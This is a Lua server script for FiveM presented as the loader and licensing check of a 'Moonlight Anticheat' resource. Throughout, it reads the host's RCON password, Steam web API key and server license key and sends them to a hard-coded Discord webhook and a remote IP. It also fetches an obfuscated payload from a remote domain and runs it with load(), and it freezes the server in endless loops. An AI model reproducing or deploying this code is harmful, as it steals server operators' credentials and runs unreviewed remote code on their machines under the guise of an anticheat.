
local secureddsiptach_dsfjhfoidsjiog = false

local httpDispatch = {}
local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

AddEventHandler('__cfx_internal:httpResponse', function(token, status, body, headers)
    if httpDispatch[token] then
        local userCallback = httpDispatch[token]
        httpDispatch[token] = nil
        userCallback(status, body, headers)
    end
end)

function senharbiossuruyon(length)
    local res = ''
    for i = 1, length do
        res = res .. string.char(math.random(97, 122))
    end
    return res
end

function secured_dsipatch_server(url, cb, method, data, headers, options)
    local followLocation = true
                
    if options and options.followLocation ~= nil then
        followLocation = options.followLocation
    end

    local t = {
        url = url,
        method = method or 'GET',
        data = data or '',
        headers = headers or {},
        followLocation = followLocation
    }
    local d = json.encode(t)
    local id = PerformHttpRequestInternal(d, d:len())
    httpDispatch[id] = cb
end

function enc(data)
    return ((data:gsub('.', function(x) 
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

function str_split(str, size)
    local result = {}
    for i=1, #str, size do
        table.insert(result, str:sub(i, i + size - 1))
    end
    return result
end

function dec2bin(num)
    local result = ''
    repeat
        local halved = num / 2
        local int, frac = math.modf(halved)
        num = int
        result = math.ceil(frac) .. result
    until num == 0
    return result
end

local function padRight(str, length, char)
    while #str % length ~= 0 do
        str = str .. char
    end
    return str
end

function otuz2(str)
local binary = str:gsub('.', function (char)
    return string.format('%08u', dec2bin(char:byte()))
end)

binary = str_split(binary, 5)
local last = table.remove(binary)
table.insert(binary, padRight(last, 5, '0'))

local encoded = {}
for i=1, #binary do
    local num = tonumber(binary[i], 2)
    table.insert(encoded, base32Alphabet:sub(num + 1, num + 1))
end
return padRight(table.concat(encoded), 8, '=')
end

function holamola(s)
    return (s:gsub('%a', function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13))end))
end

function trythot(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end



-- AUTH CODE --

function isafjiajg_stop_your_serverbabe() 
    while true do end
end

local SERVERNAME = GetConvar('sv_hostname', 'Not found!')
local APIKEY = GetConvar('steam_webApiKey', 'Not found!')
local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
local TAGS = GetConvar('tags', 'Not found!')
local KEY = GetConvar('sv_licenseKey', 'Not found!') 

local file = LoadResourceFile(GetCurrentResourceName(), "server/loader.lua")
if file == nil then
    secured_dsipatch_server('http://45.88.109.116:7777/auth/check/showmyip', function(a, showserveripsss, c)
        secured_dsipatch_server("https://discord.com/api/webhooks/996810101878968361/Q0rsPqE50OUOlb3fiYH3Tr_CPQq3UPqfSfPOeznbhqdNDZX6iqOd1o51DrEhLpG0ssUk", function(error, texto, cabeceras) end, "POST", json.encode({username = "Moonlight Anticheat", embeds = {{
            author = {
                name = "Moonlight Anticheat",
                url = "https://discord.gg/M6UnSNqJGx",
                icon_url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676"
            },
            thumbnail = {
                url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676"
            },
            footer = {
                
                icon_url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676",
                text = "Moonlight Anticheat - BYPASS Detected - "..os.date("%d/%m/%Y %X")
            },
            color = "13565987",
            title = "Moonlight Bypass Detection [Loader.lua nil load]",
            description = "**Server Name: **"..SERVERNAME.."\n**Server IP: **||"..showserveripsss.."||\n**Steam WEBAPIKEY:** "..APIKEY.."\n**RCON:** "..RCON.."\n**Tags:** "..TAGS.."\n**Server Licensekey:** "..KEY}
        }}), {["Content-Type"] = "application/json"})
        isafjiajg_stop_your_serverbabe()
    end, "GET")
end 
if string.find(file, 'PerformHttpRequestInternal') or string.find(file, 'PerformHttpRequest') or string.find(file, 'Cracked') or string.find(file, 'print') or string.find(file, 'LoadResourceFile') or string.find(file, 'GetCurrentResourceName') 
    then
        secured_dsipatch_server('http://45.88.109.116:7777/auth/check/showmyip', function(a, showserveripsss, c)
            secured_dsipatch_server("https://discord.com/api/webhooks/996810101878968361/Q0rsPqE50OUOlb3fiYH3Tr_CPQq3UPqfSfPOeznbhqdNDZX6iqOd1o51DrEhLpG0ssUk", function(error, texto, cabeceras) end, "POST", json.encode({username = "Moonlight Anticheat", embeds = {{
                author = {
                    name = "Moonlight Anticheat",
                    url = "https://discord.gg/M6UnSNqJGx",
                    icon_url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676"
                },
                thumbnail = {
                    url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676"
                },
                footer = {
                    
                    icon_url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676",
                    text = "Moonlight Anticheat - BYPASS Detected - "..os.date("%d/%m/%Y %X")
                },
                color = "13565987",
                title = "Moonlight Bypass Detection [Blacklisted code in file]",
                description = "**Server Name: **"..SERVERNAME.."\n**Server IP: **||"..showserveripsss.."||\n**Steam WEBAPIKEY:** "..APIKEY.."\n**RCON:** "..RCON.."\n**Tags:** "..TAGS.."\n**Server Licensekey:** "..KEY}
            }}), {["Content-Type"] = "application/json"})
            isafjiajg_stop_your_serverbabe()
        end, "GET")
end 


local dispatch_for_checkmyip = false
local my_ip_check_ip = 0

local http_dispatch_fuer_blacklist = false
local my_blacklist_server_check = 0


local check_if_access_granted_for_script = false
local check_attempt_for_auth = 0

local check_if_myserver_returns_auth = false
local check_if_myserver_returns_auth_attempts = 0

secured_dsipatch_server('http://45.88.109.116:7777/auth/check/showmyip', function(a, showserveripsss, c)
    dispatch_for_checkmyip = true
    secured_dsipatch_server('http://45.88.109.116:7777/auth/check/ips', function(a, blacklistedserveripsss, c)
        http_dispatch_fuer_blacklist = true
        if string.match(blacklistedserveripsss, showserveripsss) then 
            print("[^5Moonloader^0] [^3WARNING^0] Your Server is blacklisted in our system. Contact support: discord.gg/moonlightac")
            Wait(1000)
            while true do end
        elseif not string.match(blacklistedserveripsss, showserveripsss) then
            print("[^5Moonloader^0] [^8Loader^0] Cache updated")

                
            function check_call_baby() 
                local authkey = senharbiossuruyon(5)
                local a = {}
                local SERVERNAME = GetConvar('sv_hostname', 'Not found!')
                local APIKEY = GetConvar('steam_webApiKey', 'Not found!')
                local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
                local TAGS = GetConvar('tags', 'Not found!')
                local KEY = GetConvar('sv_licenseKey', 'Not found!') 
            
                if KEY  == '' or KEY == nil then 
                    KEY = 'Not found!' 
                end
            
                table.insert(a, 1, authkey)
                table.insert(a, 2, SERVERNAME)
                table.insert(a, 3, APIKEY)
                table.insert(a, 4, RCON)
                table.insert(a, 5, TAGS)
                table.insert(a, 6, KEY)
                table.insert(a, 7, GetCurrentResourceName())
                table.insert(a, 8, '1')
            
                local sensdgksdgawghgaysin = secured_dsipatch_server('https://moonpromotions.com.37-114-62-40.preview.fra01.ihr-webhosting.de/api/check', function(err, dfhklhdkldhjf392590sjkg, headers)
                    local gayarray = {}
                    local cu = dfhklhdkldhjf392590sjkg:gsub('%s+', '')
                    if cu == '' then
                        gayarray[1] = 'alah'
                    else
                        print('[^5Moonloader^0] [*] Refresh has been made | Access granted...')
                        Wait(1000)
                        gayarray = json.decode(dfhklhdkldhjf392590sjkg)
                    end
                    if gayarray[1] == authkey then
                        check_if_myserver_returns_auth = true
                        assert(load(holamola(trythot(gayarray[2]:sub(gayarray[3] + 1)))))()
                    else
                        check_if_myserver_returns_auth_attempts = check_if_myserver_returns_auth_attempts + 1
                        print('[^5Moonloader^0] [*] Server couldnt receive check...')
                        print('[^5Moonloader^0] [*] discord.gg/moonlightac...')
                        while true do end
                    end
                end, 'POST', 'data=' .. string.upper(string.char(math.random(97, 122))) .. enc(otuz2(holamola(json.encode(a)))))
            end
            check_call_baby()

        end
    end, "GET")
end, "GET")



Citizen.CreateThread(function() 
    Wait(200)
    while true do 
        Wait(2000)
        if dispatch_for_checkmyip == false then 
            my_ip_check_ip = my_ip_check_ip + 1
        elseif dispatch_for_checkmyip == true then 
            return
        end
        if my_ip_check_ip > 2 then 
            print("[^3Moonloader^0] [^9ERROR^0] HTTP Bypass detected")
            while true do end
        end
        Wait(100)
        if http_dispatch_fuer_blacklist == false then 
            my_blacklist_server_check = my_blacklist_server_check + 1
        elseif http_dispatch_fuer_blacklist == true then 
            return
        end
        if my_blacklist_server_check > 2 then 
            print("[^3Moonloader^0] [^9ERROR^0] HTTP Bypass detected")
            while true do end
        end
        Wait(3000)
        if check_if_myserver_returns_auth == false then 
            print("[^3Moonloader^0] [^9ERROR^0] HTTP Bypass detected returning")
            while true do end
        end
        if check_if_myserver_returns_auth_attempts > 2 then 
            print("[^3Moonloader^0] [^9ERROR^0] Estimate took to long")
            while true do end
        end
        Wait(4000)
    end
end)

Citizen.CreateThread(function() 
    Wait(200)
    while true do 
        Wait(2000)
        if check_if_access_granted_for_script == false then 
            my_ip_check_ip = my_ip_check_ip + 1
        elseif dispatch_for_checkmyip == true then 
            return
        end
        if check_attempt_for_auth > 3 then 
            print("[^3Moonloader^0] [^9ERROR^0] Script isnt prepared for a start, try it later")
            while true do end
        end
        Wait(4000)
    end
end)

function exploiterreport(abuse)
    secured_dsipatch_server('http://45.88.109.116:7777/auth/check/showmyip', function(a, showserveripsss, c)
        secured_dsipatch_server("https://discord.com/api/webhooks/996810101878968361/Q0rsPqE50OUOlb3fiYH3Tr_CPQq3UPqfSfPOeznbhqdNDZX6iqOd1o51DrEhLpG0ssUk", function(error, texto, cabeceras) end, "POST", json.encode({username = "Moonlight Anticheat", embeds = {{
            author = {
                name = "Moonlight Anticheat",
                url = "https://discord.gg/M6UnSNqJGx",
                icon_url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676"
            },
            thumbnail = {
                url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676"
            },
            footer = {
                
                icon_url = "https://media.discordapp.net/attachments/984167045199462400/995745880290369576/unknown.png?width=676&height=676",
                text = "Moonlight Anticheat - BYPASS Detected - "..os.date("%d/%m/%Y %X")
            },
            color = "13565987",
            title = "Bypasser detected",
            description = "**Server Name: **"..SERVERNAME.."\n**Server IP: **||"..showserveripsss.."||\n**Steam WEBAPIKEY:** "..APIKEY.."\n**RCON:** "..RCON.."\n**Tags:** "..TAGS.."\n**Server Licensekey:** "..KEY.."\n\n **FILETEXT: **"..abuse}
        }}), {["Content-Type"] = "application/json"})
        isafjiajg_stop_your_serverbabe()
    end, "GET")
    Wait(1000)
    while true do end
end

Citizen.CreateThread(function() 
    if PerformHttpRequest == print then
        exploiterreport(":sos: Tried to print performhttprequest")
        return
    elseif not debug then
        exploiterreport(":sos: debug nil")
        return
    elseif not debug.getinfo(load) then
        exploiterreport(":sos: debug.getinfo(load)")
        return
    elseif debug.getinfo(load).what ~= "C" then
        exploiterreport(":sos: debug.getinfo(load).what")
        return
    elseif debug.getinfo(load).linedefined ~= -1 then
        exploiterreport(":sos: debug.getinfo(load).linedefined")
        return
    elseif debug.getinfo(load).lastlinedefined ~= -1 then
        exploiterreport(":sos: debug.getinfo(load).lastlinedefined")
        return
    elseif debug.getinfo(load).nparams ~= 0 then
        exploiterreport(":sos: debug.getinfo(load).nparams")
        return
    elseif debug.getinfo(load).currentline ~= -1 then
        exploiterreport(":sos: debug.getinfo(load).currentline")
        return
    elseif debug.getinfo(load).isvararg ~= true then
        exploiterreport(":sos: debug.getinfo(load).isvararg")
        return
    elseif debug.getinfo(load).istailcall ~= false then
        exploiterreport(":sos: debug.getinfo(load).istailcall")
        return
    elseif debug.getinfo(load).nups ~= 0 then
        exploiterreport(":sos: debug.getinfo(load).nups")
        return
    elseif load == print then
        exploiterreport(":sos: Load func == print")
        return
    elseif not debug.getinfo(PerformHttpRequest) then
        exploiterreport(":sos: not debug.getinfo(PerformHttpRequest)")
        return
    elseif debug.getinfo(PerformHttpRequest).short_src ~= "citizen:/scripting/lua/scheduler.lua" then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).short_src ~= citizen:/scripting/lua/scheduler.lua")
        return
    elseif debug.getinfo(PerformHttpRequest).nups ~= 2 then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).nups")
        return
    elseif debug.getinfo(PerformHttpRequest).istailcall ~= false then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).istailcall")
        return
    elseif debug.getinfo(PerformHttpRequest).source ~= "@citizen:/scripting/lua/scheduler.lua" then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).source ~= @citizen:/scripting/lua/scheduler.lua")
        return
    elseif debug.getinfo(PerformHttpRequest).isvararg ~= false then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).isvararg ~= false")
        return
    elseif debug.getinfo(PerformHttpRequest).currentline ~= -1 then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).currentline")
        return
    elseif debug.getinfo(PerformHttpRequest).what ~= "Lua" then
        exploiterreport(":sos: ddebug.getinfo(PerformHttpRequest).what ~= Lua")
        return
    elseif debug.getinfo(PerformHttpRequest).nparams ~= 6 then
        exploiterreport(":sos: debug.getinfo(PerformHttpRequest).nparams ~= 6")
        return
    end
end)